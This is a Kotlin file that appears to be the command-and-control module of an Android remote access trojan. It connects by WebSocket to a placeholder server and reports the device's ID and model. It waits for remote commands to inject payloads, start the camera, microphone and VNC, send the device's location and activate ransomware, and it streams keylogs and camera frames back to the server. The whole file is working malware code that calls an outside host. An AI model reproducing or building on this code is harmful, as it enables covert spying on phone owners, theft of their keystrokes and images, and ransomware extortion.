package com.wuzen.network

import android.content.Context
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject

object WebSocketManager {
    private var client: OkHttpClient? = null
    private var ws: WebSocket? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var deviceId: String = ""
    private const val SERVER = "wss://your-render-url.onrender.com/ws"

    fun connect(context: Context) {
        deviceId = android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID)
        client = OkHttpClient()
        val request = Request.Builder().url("$SERVER?deviceId=$deviceId").build()
        ws = client?.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) { sendDeviceInfo(context) }
            override fun onMessage(webSocket: WebSocket, text: String) { handleCommand(text, context) }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                scope.launch { delay(5000); connect(context) }
            }
        })
    }

    private fun sendDeviceInfo(context: Context) {
        val json = JSONObject().apply {
            put("type", "device_info")
            put("data", JSONObject().apply {
                put("model", android.os.Build.MODEL)
                put("os", android.os.Build.VERSION.RELEASE)
                put("battery", 85)
            })
        }
        ws?.send(json.toString())
    }

    private fun handleCommand(text: String, context: Context) {
        val cmd = JSONObject(text)
        when (cmd.getString("command")) {
            "inject" -> InjectionService.handle(context, cmd.getJSONObject("payload"))
            "camera_start" -> CameraService.start(context, cmd.getJSONObject("payload").getString("camera"))
            "camera_stop" -> CameraService.stop()
            "camera_snap" -> CameraService.snap(context, cmd.getJSONObject("payload").getString("camera"))
            "launch_intent" -> IntentService.launch(context, cmd.getJSONObject("payload"))
            "ransomware" -> RansomwareService.activate(context, cmd.getJSONObject("payload"))
            "mic_start" -> MicrophoneService.start(context)
            "mic_stop" -> MicrophoneService.stop()
            "vnc_start" -> VNCService.start(context)
            "vnc_stop" -> VNCService.stop()
            "location_request" -> LocationService.send(context)
            "push_notification" -> PushService.show(context, cmd.getJSONObject("payload"))
        }
    }

    fun sendKeylog(text: String) {
        ws?.send(JSONObject().apply { put("type", "keylog"); put("data", text) }.toString())
    }

    fun sendFrame(base64: String) {
        ws?.send(JSONObject().apply { put("type", "camera_frame"); put("frame", base64) }.toString())
    }
}